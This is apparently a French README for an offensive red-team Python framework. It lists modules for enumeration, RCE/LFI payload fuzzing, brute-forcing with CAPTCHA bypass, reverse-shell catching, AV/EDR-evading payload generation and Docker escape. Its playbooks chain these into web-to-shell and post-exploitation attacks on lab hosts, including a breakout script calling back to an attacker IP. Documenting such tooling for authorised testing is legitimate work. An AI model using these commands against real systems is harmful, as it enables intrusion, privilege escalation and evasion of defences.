```markdown
# ⚔️ Red_Framework 

Un framework d'automatisation Red Team "Enterprise-Grade" développé en Python. Cette version **V7 (Ultimate Edition)** transforme l'outil en un écosystème autonome, asynchrone et intelligent, intégrant un mode "Auto-Pilot" pour les wordlists, une détection de WAF, et un arsenal complet pour l'audit Web et d'infrastructure.

⚠️ **Avertissement Légal :** Cet outil est strictement réservé à un usage légal dans le cadre d'audits de cybersécurité autorisés ou de laboratoires DevSecOps. L'auteur décline toute responsabilité en cas d'usage malveillant.

---

## 🛠️ Installation & Dépendances

**Sous Linux (Recommandé)**
```bash
# 1. Cloner le répertoire
git clone [https://github.com/votre-nom/Red_Framework.git](https://github.com/votre-nom/Red_Framework.git)
cd Red_Framework

# 2. Créer l'environnement virtuel et l'activer
python3 -m venv .venv
source .venv/bin/activate

# 3. Installer les dépendances (aiohttp, beautifulsoup4, rich, etc.)
pip install -r requirements.txt

# 4. Initialiser l'arsenal (Télécharge les wordlists par défaut)
python arsenal.py update
```

**Sous Windows**
```powershell
git clone [https://github.com/votre-nom/Red_Framework.git](https://github.com/votre-nom/Red_Framework.git)
cd Red_Framework
pip install -r requirements.txt
python arsenal.py update
```

---

## 🧠 Philosophie de la V7

1. **Vitesse Asynchrone :** Propulsé par `aiohttp` et `asyncio`, le framework peut envoyer des milliers de requêtes par seconde en consommant un minimum de RAM.
2. **Auto-Pilot (Cascade) :** Les modules offensifs n'ont plus besoin d'un dictionnaire strict. Ils utilisent une cascade intelligente : ils testent d'abord vos mots-clés sur-mesure, puis basculent silencieusement sur les standards de l'industrie (SecLists).
3. **Furtivité Intégrée :** Détection automatique des pare-feux applicatifs (WAF) pour éviter le bannissement d'IP.
4. **Tooling Autonome :** Remplace les outils lourds (comme Burp Suite ou netcat) grâce à ses modules natifs (`intruder`, `catch`, `decoder`).

---

## 📂 Architecture du Framework

```text
Red_Framework/
├── arsenal.py          # Routeur principal (Point d'entrée unique)
├── core/               # Le Cerveau
│   ├── config.py       # Configuration globale
│   ├── waf.py          # Bouclier anti-bannissement (Détection WAF)
│   ├── utils.py        # Résolveur intelligent de wordlists
│   └── reporter.py     # Moteur d'auto-documentation
├── modules/            # L'Armurerie (Plus de 20 modules offensifs)
├── wordlists/          # Les Munitions (Téléchargées via 'update' & générées)
└── reports/            # Les Trophées (Rapports .html générés)
```

---

## 📖 Aide-Mémoire des Commandes (Cheatsheet)

L'Arsenal est piloté par un routeur central asynchrone. Utilisez `python arsenal.py <module> -h` pour le détail des options.

### 📡 1. Reconnaissance & Infrastructure

| Commande | Action |
| --- | --- |
| `python arsenal.py sub -d <domaine>` | **Hybride Enum :** Reconnaissance OSINT (`crt.sh`) + Brute-force DNS asynchrone. |
| `python arsenal.py vhost -i <IP> -d <domaine> -w <wordlist>` | **VHost Hunter :** Fuzzing de Virtual Hosts pour découvrir des sous-domaines cachés sur une même IP. |
| `python arsenal.py scan -T <IP>` | **Scanner de Ports :** Scan TCP furtif, Banner Grabbing et recherche auto de CVE. |
| `python arsenal.py s3 -n <nom>` | **S3 Hunter :** Traque des buckets AWS S3 mal configurés. |

### 🌐 2. Audit Web & Intelligence

| Commande | Action |
| --- | --- |
| `python arsenal.py api-hunter -u <URL>` | **API Hunter :** Traque les documentations d'API (Swagger, OpenAPI) et les endpoints non sécurisés. |
| `python arsenal.py intruder -r <req.txt> -w <wordlist>` | **Burp Intruder :** Fuzzer asynchrone ultra-rapide basé sur une requête brute (remplace `§FUZZ§`). |
| `python arsenal.py nuke -u "<URL>"` | **Param Nuke :** Bombarde un paramètre d'URL (ex: `?id=1`) avec des payloads RCE et LFI critiques. |
| `python arsenal.py brute-web -u <URL> -U <user>` | **Custom Brute :** Attaque HTTP POST asynchrone avec gestion de session (bypasse certains CAPTCHAs). |
| `python arsenal.py js-sniper -u <URL>` | **JS Sniper :** Extrait les clés d'API et routes cachées dans les fichiers JavaScript clients. |
| `python arsenal.py spider -u <URL>` | **Web Crawler :** Cartographie récursive. Lance automatiquement le détecteur de CMS au démarrage. |

### 🔑 3. Exploitation & Post-Exploitation

| Commande | Action |
| --- | --- |
| `python arsenal.py catch -p 4444` | **Shell Catcher :** Écoute un reverse shell et injecte automatiquement les commandes de stabilisation PTY (adieu `nc`). |
| `python arsenal.py docker --lhost <IP>` | **Docker Breakout :** Génère un script Bash d'évasion pour fuir un conteneur et compromettre l'hôte. |
| `python arsenal.py smb -T <IP>` | **SMB Ghost :** Test de Null Session et énumération des partages Windows (Port 445). |
| `python arsenal.py crack --hash <hash>` | **Hash Cracker :** Casse les hashes (MD5, SHA1, SHA256) hors-ligne. |
| `python arsenal.py payload -c <cmd>` | **Payload Gen :** Génère des charges utiles obfusquées pour l'évasion d'AV/EDR. |

### 🛠️ 4. Utilitaires & Reporting

| Commande | Action |
| --- | --- |
| `python arsenal.py decoder <encode/decode> <format> <txt>` | **Burp Decoder :** Encode/Décode instantanément à la volée (Base64, URL, Hex, HTML). |
| `python arsenal.py update` | **Resource Fetcher :** Télécharge les wordlists SecLists indispensables en local. |
| `python arsenal.py wordlist -k <mots_clés>` | **Mutation Gen :** Forge un dictionnaire sur-mesure hybride dans le répertoire courant. |
| `python arsenal.py export` | **Report Generator :** Exporte toutes les découvertes de la session dans un dashboard HTML interactif. |

---

## 📖 Référence Complète des Modules

| Module | Rôle | Arguments Requis | Arguments Optionnels (Défaut) |
| :--- | :--- | :--- | :--- |
| **`update`** | MàJ des wordlists | *Aucun* | *Aucun* |
| **`wordlist`** | Dictionnaire sur-mesure | `-k / --keywords` | `-o / --output` (`custom_wordlist.txt`) |
| **`sub`** | Énumération DNS | `-d / --domain` | `-w` (`auto`), `-t` (`50`), `--auto-scan` |
| **`vhost`** | Fuzzing Virtual Host | `-i / --ip`, `-d / --domain`, `-w / --wordlist` | `-t / --threads` (`50`) |
| **`enum`** | Fuzzing répertoires | `-u / --url`, `-w / --wordlist` | `-t` (`20`), `-e` (`""`) |
| **`api-hunter`**| Chasseur Swagger | `-u / --url` | `-w` (`auto`), `-t` (`30`) |
| **`brute-web`** | Attaque HTTP POST | `-u / --url`, `-U / --user` | `-w` (`auto`), `-t` (`10`), `--cookie`, `--captcha-val` |
| **`intruder`** | Clone Burp Intruder | `-r / --request`, `-w / --wordlist` | `-s / --scheme` (`http`), `-p / --port` (`80`), `-t` (`30`) |
| **`nuke`** | Injection RCE / LFI | `-u / --url` | `-t / --threads` (`20`) |
| **`spider`** | Crawler web | `-u / --url` | `-d / --depth` (`2`), `-t` (`10`), `--proxy` |
| **`decoder`** | Encodage à la volée | `mode`, `format`, `text` | *Aucun* |
| **`crack`** | Casseur de hash | `--hash` | `--algo` (`md5`), `-w / --wordlist` (`auto`) |
| **`scan`** | Scanner TCP | `-T / --target` | `-s` (`1`), `-e` (`1024`), `-t` (`100`) |
| **`catch`** | Auto-Pty Shell | *Aucun* | `-p / --port` (`4444`) |
| **`payload`** | Générateur agent | `-c` **OU** `--revshell` | *Aucun* |
| **`cms`** | Fingerprinting web | `-u / --url` | *Aucun* |
| **`secrets`** | Chasse fichiers cachés | `-u / --url` | *Aucun* |
| **`headers`** | Analyse sécurité HTTP| `-u / --url` | *Aucun* |
| **`smb`** | Énum. Null Session | `-T / --target` | *Aucun* |
| **`s3`** | Chasse buckets AWS | `-n / --name` | *Aucun* |
| **`ldap`** | Requête LDAP | `-T / --target` | *Aucun* |
| **`js-sniper`**| Extracteur secrets JS| `-u / --url` | `-t / --threads` (`10`) |
| **`docker`** | Évasion conteneur | `--lhost` | `--lport` (`4444`), `-o` (`breakout.sh`) |
| **`export`** | Export HTML | *Aucun* | *Aucun* |
| **`notes`** | Visionneuse terminal | *Aucun* | *Aucun* |

---
```
```markdown
## 🎯 Scénarios d'Attaque (Playbooks)

Voici comment enchaîner les modules du Red_Framework lors d'un audit réel pour maximiser vos chances de compromission, de la reconnaissance jusqu'au shell root.

### Scénario 1 : La Boîte Noire (Web-to-Shell)
*Objectif : Compromettre un serveur web externe dont on ne connaît que le nom de domaine.*

**1. Reconnaissance Globale :**
On commence par cartographier la surface d'attaque externe.
```bash
python arsenal.py sub -d target.htb --auto-scan
python arsenal.py vhost -i 10.10.10.50 -d target.htb -w wordlists/vhosts.txt
```

**2. Analyse de l'Application :**
On fouille l'application principale à la recherche d'endpoints cachés et de technologies vulnérables.
```bash
python arsenal.py spider -u [http://target.htb](http://target.htb)
python arsenal.py api-hunter -u [http://target.htb](http://target.htb)
python arsenal.py js-sniper -u [http://target.htb](http://target.htb)
```

**3. Exploitation (La Faille) :**
Le `spider` a révélé un paramètre `?page=`. On sort l'artillerie lourde pour chercher une LFI/RCE, tout en préparant notre filet pour attraper le shell.
```bash
# Dans le Terminal 1 (On écoute) :
python arsenal.py catch -p 4444

# Dans le Terminal 2 (On attaque) :
python arsenal.py nuke -u "[http://target.htb/index.php?page=about](http://target.htb/index.php?page=about)"
```

---

### Scénario 2 : L'Infiltration Interne (Post-Exploitation)
*Objectif : Vous avez obtenu un accès de bas niveau. Il faut élever vos privilèges et pivoter.*

**1. Fouille des Secrets et Réseau :**
On cherche des mots de passe oubliés ou des partages ouverts.
```bash
python arsenal.py secrets -u [http://127.0.0.1:8080](http://127.0.0.1:8080)
python arsenal.py smb -T 10.10.10.50
```

**2. Cassage de Hashes :**
Vous avez trouvé un hash NTLM ou MD5 dans un fichier de config ou via SMB. On le casse hors-ligne.
```bash
python arsenal.py crack --hash 5d41402abc4b2a76b9719d911017c592 --algo md5
```

**3. Évasion (Privilege Escalation) :**
Vous êtes coincé dans un conteneur Docker. On génère le script pour s'enfuir vers l'hôte physique.
```bash
python arsenal.py docker --lhost 10.10.14.5 --lport 9001 -o escape.sh
# Transférez escape.sh sur la cible et exécutez-le !
```

**4. Génération du Rapport Final :**
Une fois la machine "Rootée", on exporte le tableau de bord pour le client.
```bash
python arsenal.py export
```
```
